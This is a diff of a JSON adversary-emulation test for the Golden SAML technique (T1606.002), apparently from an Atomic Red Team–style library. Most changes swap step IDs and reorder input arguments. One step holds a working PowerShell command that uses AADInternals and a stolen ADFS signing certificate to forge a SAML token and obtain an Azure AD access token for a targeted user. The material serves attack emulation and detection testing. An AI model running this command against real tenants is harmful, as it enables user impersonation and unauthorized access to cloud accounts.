@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "47cec78b-d337-4037-bccc-104e88eab7e9",
+      "id": "96cbc330-e622-4ce6-905a-87e043081c72",
       "type": "execute-command",
       "data": {
         "command": "Import-Module AADInternals -Force\n$saml = New-AADIntSAMLToken -ImmutableID \"#{immutable_id}\" -PfxFileName \"#{certificate_path}\" -Issuer \"#{issuer_uri}\"\n$conn = Get-AADIntAccessTokenForAADGraph -SAMLToken $saml -SaveToCache\nif ($conn) { Write-Host \"`nSuccessfully connected as $($conn.User)\" } else { Write-Host \"`nThe connection failed\" }\nWrite-Host \"End of Golden SAML\"\n",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "e009eff0-0796-4618-a1a7-52c8f6e3c697",
+      "id": "39af643e-e7c6-46bc-9740-f9980461e7bc",
       "name": "Check dependency 1/1",
       "description": "AADInternals module must be installed.\n",
       "type": "execute-command",
@@ -27,7 +27,7 @@
       "elevation_required": false
     },
     {
-      "id": "8ae720d7-da92-40f3-82c4-b55b451f4ddc",
+      "id": "a8267fbb-3b86-473a-87fd-c2583b636a99",
       "name": "Resolve dependency 1/1",
       "description": "AADInternals module must be installed.\n",
       "type": "execute-command",
@@ -38,7 +38,7 @@
       "elevation_required": false
     },
     {
-      "id": "352dc5ff-3627-434c-b069-943b37c803d5",
+      "id": "617f3f4d-2a11-4579-af52-91d0691daa47",
       "name": "Re-check dependency 1/1",
       "description": "AADInternals module must be installed.\n",
       "type": "execute-command",
@@ -51,31 +51,37 @@
   ],
   "flows": [
     {
-      "s": "e009eff0-0796-4618-a1a7-52c8f6e3c697",
+      "s": "39af643e-e7c6-46bc-9740-f9980461e7bc",
       "p": "on-success",
-      "o": "47cec78b-d337-4037-bccc-104e88eab7e9"
+      "o": "96cbc330-e622-4ce6-905a-87e043081c72"
     },
     {
-      "s": "e009eff0-0796-4618-a1a7-52c8f6e3c697",
+      "s": "39af643e-e7c6-46bc-9740-f9980461e7bc",
       "p": "on-failure",
-      "o": "8ae720d7-da92-40f3-82c4-b55b451f4ddc"
+      "o": "a8267fbb-3b86-473a-87fd-c2583b636a99"
     },
     {
-      "s": "8ae720d7-da92-40f3-82c4-b55b451f4ddc",
+      "s": "a8267fbb-3b86-473a-87fd-c2583b636a99",
       "p": "on-success",
-      "o": "352dc5ff-3627-434c-b069-943b37c803d5"
+      "o": "617f3f4d-2a11-4579-af52-91d0691daa47"
     },
     {
-      "s": "352dc5ff-3627-434c-b069-943b37c803d5",
+      "s": "617f3f4d-2a11-4579-af52-91d0691daa47",
       "p": "on-failure",
-      "o": "47cec78b-d337-4037-bccc-104e88eab7e9"
+      "o": "96cbc330-e622-4ce6-905a-87e043081c72"
     }
   ],
   "tags": [
-    "T1606.002",
-    "atomic-red-team"
+    "T1606",
+    "T1606.002"
   ],
   "input_arguments": [
+    {
+      "name": "immutable_id",
+      "type": "string",
+      "description": "ImmutableId of the targeted user. It can be obtained with AzureAD powershell module; $(Get-AzureADUser -SearchString \"username\").ImmutableId",
+      "value": "aehgdqBTZV50DKQZmNJ8mg=="
+    },
     {
       "name": "issuer_uri",
       "type": "string",
@@ -87,12 +93,6 @@
       "type": "path",
       "description": "Token signing certificate path. See T1552.004 to export it",
       "value": ".\\ADFS_signing.pfx"
-    },
-    {
-      "name": "immutable_id",
-      "type": "string",
-      "description": "ImmutableId of the targeted user. It can be obtained with AzureAD powershell module; $(Get-AzureADUser -SearchString \"username\").ImmutableId",
-      "value": "aehgdqBTZV50DKQZmNJ8mg=="
     }
   ]
 }
